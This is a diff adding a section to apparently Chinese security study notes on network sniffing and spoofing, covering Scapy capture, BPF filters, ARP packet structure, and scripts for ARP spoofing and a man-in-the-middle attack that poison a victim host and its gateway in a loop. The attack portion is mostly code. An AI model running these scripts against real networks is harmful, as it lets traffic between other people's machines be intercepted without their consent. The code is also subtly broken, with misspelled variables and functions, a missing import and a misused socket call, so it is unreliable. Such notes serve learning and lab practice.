@@ -864,3 +864,174 @@ s.close()
 
 # 网络嗅探&欺骗
 
+```python
+The quieter you are the more you are able to hear
+```
+
+#### 嗅探-总览
+
+```python
+所有通过网卡的数据都是可以被读取的
+数据仅是按照不同协议组织到一起了
+从协议去分析数据
+当然，大厂有自己的自研协议
+```
+
+#### 嗅探-Scapy sniff()参数&&过滤器
+
+```python
+count:表示要捕获数据包的数量。默认为0，表示不限制数量
+store:表示是否要保存捕获到的数据包。默认为1
+prn:该参数其实是一个函数，该函数会应用在每一个捕获到的数据包上。若有返回值，则会显示出来。默认为空
+iface:表示要使用的网卡或网卡列表
+**************************************************************
+伯克利包过滤语法，即BPF，使用原语来完成对数据包的描述
+原语表达式可以用与或非等逻辑运算，也可以加以Type\Dir\Proto等限定词
+可以确定应该获取、检查、过滤哪些流量
+通过比较各个协议中数据字段值的方法对流量进行过滤
+Type:用来规定使用名字或数字代表的类型，例如host\net\port
+Dir:用来规定流量的方向，例如src\dst\src and dst
+Proto:用来规定匹配的协议，例如ip\tcp\arp
+```
+
+#### 嗅探-工具代码
+
+```python
+#捕获和特定主机通信的1000个数据包，并保存到catch.pcap数据包中
+from scapy.all import *
+import sys
+iflen(sys.argv) !=2:
+    print('Usage:catchPackets<IP>\n eg:catchPackets 192.168.92.2')
+    sys.exit(1)
+ip = sys.argv[1]
+def Callback(packet):
+    print packet.show()
+packets=sniff(filter="host"+ip,prn=Callback,count=5)
+wrpcap("catch.pcap",packets)
+```
+
+#### 欺骗-总览
+
+```python
+篡改数据
+伪造数据
+```
+
+#### 欺骗-ARP协议原理&缺陷&数据包格式
+
+```python
+ARP的主要原因是以太网中使用的设备交换机不能识别IP地址，只能识别硬件地址
+在交换机中内容寻址寄存表(CAM),该表列出了交换机每个端口所连接设备的硬件地址
+当交换机收到一个发往特定硬件地址的数据包，就首先从表中查找对应表项，有的话就直接发往端口
+软件使用的是IP地址，交换机使用的是硬件地址，故在软件将数据包交给交换机之前，会发生IP与硬件地址的转换
+支持ARP的主机中有一个ARP表，该表中保存了已知的IP与硬件地址的对应关系，同样的，优先找表中有无对应表项，没有的话就会产生一个ARP广播，广播给网段中的所有设备，目标主机回应后，将新的表项添加到ARP表中
+但缺少认证机制
+故ARP表可能被脏，可能冒充
+**************************************************************
+ARP数据包格式
+    以太网目的地址，6位
+    以太网源地址，6位
+    帧类型，2位
+    硬件类型，2位
+    协议类型，2位
+    硬件地址长度，1位
+    协议地址长度，1位
+    op，2位
+    发送端以太网地址，6位
+    发送端IP地址，4位
+    目的以太网地址，6位
+    目的IP地址，4位
+```
+
+#### 欺骗-ARP欺骗
+
+```python
+arpspoof
+**************************************************************
+#构造数据包
+#源IP地址：192.168.169.2(网关的IP地址)
+#源硬件地址：00:00:11:22:33:44(kali的硬件地址)
+#目标IP地址：192.168.169.3(要欺骗主机的IP地址)
+#目标硬件地址：00:00:44:33:22:11
+#ARP类型：request
+#Scapy
+#ls(ARP)
+#op=1
+#gatewayIP="192.168.169.2"
+#victimIP="192.168.169.3"
+#ls(Ether)
+#srcMAC="00:00:11:22:33:44"
+#dstMAC="00:00:44:33:22:11"
+#sendp(Ether(dst=dstMAC,src=srcMAC)/ARP(psrc=gatewayIP,pdst=vimtimIP))
+**************************************************************
+import sys
+from scapy.all import sendp,ARP,Ether
+if len(sys.argv) !=3:
+    print sys.argv[0] + ": <target><spoof_ip>"
+    sys.exit(1)
+victimIP=sys.argv[1]
+gatewayIP=sys.argv[2]
+packet=Ether()/ARP(psrc=gatewayIP,pdst=vimtimIP)
+while 1:
+    sendp(packet)
+    time.sleep(10)
+    print packet.show()
+```
+
+#### 欺骗-中间人欺骗
+
+```python
+#Scapy
+#开启中间人欺骗，需要同时对目标主机和网关都进行欺骗
+#ARP表项有生命周期，需要不断欺骗(循环 sedp(attackTarget,inter=1,loop=1))
+import sys
+import time
+from scapy.all import sendp,ARP,Ether
+if len(sys.argv) !=3:
+    print sys.argv[0] + ": <target><spoof_ip>"
+    sys.exit(1)
+victimIP=sys.argv[1]
+gatewayIP=sys.argv[2]
+#欺骗主机
+attackTarget=Ether()/ARP(psrc=gatewayIP,pdst=vimtimIP)
+#欺骗网关
+attackGateway=Ether()/ARP(psrc=vimtimIP,pdst=gatewayIP)
+#循环  inter指定时间间隔  loop=1实现循环发送
+sedp(attackTarget,inter=1,loop=1)
+sedp(attackGateway,inter=1,loop=1)
+**************************************************************
+#Socket
+#按照ARP数据包格式构造socket数据包
+#    以太网目的地址，6位
+#    以太网源地址，6位
+#    帧类型，2位
+#    硬件类型，2位
+#    协议类型，2位
+#    硬件地址长度，1位
+#    协议地址长度，1位
+#    op，2位
+#    发送端以太网地址，6位
+#    发送端IP地址，4位
+#    目的以太网地址，6位
+#    目的IP地址，4位
+import socket
+import struct
+import binascii
+s=socket(socket.PF_PACKET,socket.SOCK_RAW,socket.ntohs(0x0800))
+s.bind(("eth0",socket.htons(0x0800)))
+srcMAC=''
+dstMAC=''
+code=''
+htype=''
+ptotype=''
+hsize=''
+psize=''
+opcode=''
+gatewayIP=''
+victimIP=''
+packet=dstMAC + srcMAC + code + htype + protype + hsize + psize + opcode + srcMAC + socket.inet_aton(gatewayIP) + dstMAC + socket.inet_aton(victimIP)
+while 1:
+    s.send(packet)
+```
+
+# 拒绝服务攻击
